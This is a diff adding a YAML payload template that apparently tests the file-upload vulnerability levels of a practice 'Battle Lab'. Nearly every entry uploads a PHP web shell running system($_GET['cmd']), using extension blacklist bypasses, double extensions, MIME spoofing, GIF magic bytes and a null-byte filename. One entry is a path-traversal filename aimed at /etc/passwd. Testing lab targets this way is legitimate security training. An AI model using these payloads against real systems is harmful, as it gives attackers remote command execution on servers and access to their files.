@@ -1,0 +1,87 @@
+name: "Battle Lab - All Endpoints Test"
+description: "Tests all 13 vulnerability levels of the Battle Lab"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "all"
+
+target:
+  endpoint: "/api/upload/unrestricted"
+  method: "POST"
+  param: "file"
+
+payloads:
+  # Level 0: Unrestricted
+  - name: "PHP webshell - Level 0"
+    filename: "shell.php"
+    extension: ".php"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-0", "unrestricted"]
+
+  # Level 2: Blacklist bypass
+  - name: "PHP5 bypass - Level 2"
+    filename: "shell.php5"
+    extension: ".php5"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-2", "blacklist-bypass"]
+
+  - name: "PHTML bypass - Level 2"
+    filename: "shell.phtml"
+    extension: ".phtml"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-2", "phtml"]
+
+  # Level 5: Double extension
+  - name: "Double extension - Level 5"
+    filename: "shell.php.txt"
+    extension: ".txt"
+    content_type: "text/plain"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-5", "double-ext"]
+
+  - name: "Double extension image - Level 5"
+    filename: "image.jpg.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-5", "double-ext"]
+
+  # Level 3: Content-Type spoof
+  - name: "Content-Type spoof - Level 3"
+    filename: "shell.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-3", "mime-spoof"]
+
+  # Level 4: Magic byte bypass
+  - name: "GIF magic bytes - Level 4"
+    filename: "shell.php"
+    extension: ".php"
+    content_type: "image/gif"
+    body: "GIF89a\n<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-4", "magic-byte"]
+
+  # Level 6: Path traversal
+  - name: "Path traversal - Level 6"
+    filename: "../../../etc/passwd"
+    extension: ".txt"
+    body: "test"
+    tags: ["battle-lab", "level-6", "path-traversal"]
+
+  # Level 7: Null byte
+  - name: "Null byte - Level 7"
+    filename: "shell.php%00.jpg"
+    extension: ".jpg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["battle-lab", "level-7", "null-byte"]
+
+success_indicators:
+  - '"success":true'
+  - "File uploaded successfully"
+  - "uploaded"
+  - "200 OK"
+
+failure_indicators:
+  - "File type not allowed"
+  - "Invalid file"
+  - "blocked"
